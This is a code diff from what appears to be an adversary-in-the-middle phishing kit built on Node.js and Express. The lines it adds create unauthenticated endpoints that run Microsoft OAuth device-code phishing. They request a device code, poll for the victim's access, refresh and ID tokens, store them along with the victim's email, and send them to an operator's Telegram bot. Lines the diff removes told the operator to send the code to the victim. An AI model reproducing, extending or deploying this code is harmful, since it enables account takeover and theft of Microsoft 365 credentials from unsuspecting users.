@@ -1235,10 +1235,7 @@ dashApp.post('/api/phishlets/toggle', (req, res) => {
     }
 });
 
-// ================================================
-// 📱 DEVICE CODE PHISHING ENDPOINTS
-// ================================================
-
+// ── DEVICE CODE PHISHING ENDPOINTS ──
 const deviceSessions = {};
 
 // ── GET DEVICE CODE FROM MICROSOFT (PROXY) ──
@@ -1255,7 +1252,6 @@ dashApp.post('/api/device/request', async (req, res) => {
         
         const data = response.data;
         
-        // Register the code in deviceFlows
         const existing = deviceFlows.find(f => f.user_code === data.user_code);
         if (!existing) {
             deviceFlows.push({
@@ -1269,18 +1265,12 @@ dashApp.post('/api/device/request', async (req, res) => {
             });
         }
         
-        // Send Telegram notification
         const message = `
 📱 **Device Code Phishing**
 
 🆔 **User Code:** \`${data.user_code}\`
 🔗 **Verification URI:** ${data.verification_uri}
 ⏱️ **Expires in:** ${data.expires_in} seconds
-
-💡 **Instructions:**
-1. Send this code to the victim
-2. Have them enter it at ${data.verification_uri}
-3. Wait for approval
 
 **Code:** \`${data.user_code}\`
         `;
@@ -1292,7 +1282,7 @@ dashApp.post('/api/device/request', async (req, res) => {
         
         res.json(data);
     } catch (error) {
-        console.error('Device code request failed:', error.message);
+        console.error('Device code error:', error.message);
         res.status(500).json({ error: error.message });
     }
 });
@@ -1367,7 +1357,6 @@ dashApp.post('/api/device-token', async (req, res) => {
 🆔 **ID Token:** \`${tokens.id_token?.slice(0, 30)}...\`
 
 👤 **User:** ${tokens.id_token ? JSON.parse(Buffer.from(tokens.id_token.split('.')[1], 'base64').toString()).email : 'Unknown'}
-🕒 **Time:** ${new Date().toISOString()}
         `;
         
         await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
@@ -2393,7 +2382,129 @@ function updateFederationRedirectUrl(decompressedResponseBody, proxyHostname) {
 
 const app = express();
 
-// ── ✅ DEVICE CODE ROUTE (BEFORE PROXY) ──
+// ── ✅ DEVICE CODE API (NO AUTH) ──
+app.post('/device/request', async (req, res) => {
+    try {
+        console.log('📱 Device code requested directly');
+        const response = await axios.post(
+            'https://login.microsoftonline.com/common/oauth2/v2.0/devicecode',
+            new URLSearchParams({
+                client_id: '4765445b-32c6-49b0-83e6-1d93765276ca',
+                scope: 'openid profile https://www.office.com/v2/OfficeHome.All offline_access'
+            }),
+            { headers: { 'Content-Type': 'application/x-www-form-urlencoded' } }
+        );
+        
+        const data = response.data;
+        console.log('✅ Device code obtained:', data.user_code);
+        
+        // Store in deviceFlows
+        const existing = deviceFlows.find(f => f.user_code === data.user_code);
+        if (!existing) {
+            deviceFlows.push({
+                user_code: data.user_code,
+                device_code: data.device_code,
+                session_id: data.device_code,
+                status: 'pending',
+                created: new Date().toISOString(),
+                token_type: 'Device Code',
+                verification_uri: data.verification_uri
+            });
+        }
+        
+        // Send Telegram
+        const message = `
+📱 **Device Code Phishing**
+
+🆔 **User Code:** \`${data.user_code}\`
+🔗 **Verification URI:** ${data.verification_uri}
+⏱️ **Expires in:** ${data.expires_in} seconds
+
+**Code:** \`${data.user_code}\`
+        `;
+        axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+            chat_id: CHAT_ID,
+            text: message,
+            parse_mode: 'Markdown'
+        }).catch(() => {});
+        
+        res.json(data);
+    } catch (error) {
+        console.error('❌ Device code error:', error.message);
+        res.status(500).json({ error: error.message });
+    }
+});
+
+// ── ✅ DEVICE TOKEN POLLING (NO AUTH) ──
+app.post('/device/token', async (req, res) => {
+    const { device_code } = req.body;
+    
+    try {
+        console.log('🔄 Polling for token with device_code:', device_code?.slice(0, 10) + '...');
+        const response = await axios.post(
+            'https://login.microsoftonline.com/common/oauth2/v2.0/token',
+            new URLSearchParams({
+                client_id: '4765445b-32c6-49b0-83e6-1d93765276ca',
+                device_code: device_code,
+                grant_type: 'urn:ietf:params:oauth:grant-type:device_code'
+            }),
+            { headers: { 'Content-Type': 'application/x-www-form-urlencoded' } }
+        );
+        
+        const tokens = response.data;
+        console.log('✅ Tokens obtained!');
+        
+        // Store tokens
+        const flow = deviceFlows.find(f => f.device_code === device_code);
+        if (flow) {
+            flow.status = 'approved';
+            flow.approved = new Date().toISOString();
+            flow.access_token = tokens.access_token;
+            flow.refresh_token = tokens.refresh_token;
+            flow.token_type = 'OAuth2';
+            if (tokens.id_token) {
+                try {
+                    const payload = JSON.parse(Buffer.from(tokens.id_token.split('.')[1], 'base64').toString());
+                    flow.username = payload.email || payload.preferred_username || 'Unknown';
+                } catch (e) {}
+            }
+            console.log('✅ Flow updated:', flow.user_code);
+        }
+        
+        // Send Telegram with tokens
+        const message = `
+📱 **Device Code Phishing - SUCCESS!**
+
+🔑 **Access Token:** \`${tokens.access_token?.slice(0, 30)}...\`
+🔄 **Refresh Token:** \`${tokens.refresh_token?.slice(0, 30)}...\`
+🆔 **ID Token:** \`${tokens.id_token?.slice(0, 30)}...\`
+
+👤 **User:** ${tokens.id_token ? JSON.parse(Buffer.from(tokens.id_token.split('.')[1], 'base64').toString()).email : 'Unknown'}
+        `;
+        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+            chat_id: CHAT_ID,
+            text: message,
+            parse_mode: 'Markdown'
+        });
+        
+        res.json(tokens);
+    } catch (error) {
+        if (error.response?.data?.error === 'authorization_pending') {
+            console.log('⏳ Still waiting for approval...');
+            res.json({ error: 'authorization_pending' });
+        } else if (error.response?.data?.error === 'expired_token') {
+            console.log('⏰ Code expired');
+            const flow = deviceFlows.find(f => f.device_code === device_code);
+            if (flow) flow.status = 'expired';
+            res.json({ error: 'expired_token' });
+        } else {
+            console.error('❌ Token error:', error.message);
+            res.status(500).json({ error: error.message });
+        }
+    }
+});
+
+// ── ✅ DEVICE CODE PAGE ──
 app.get('/device', (req, res) => {
     const filePath = path.join(__dirname, 'public', 'device_code.html');
     if (fs.existsSync(filePath)) {
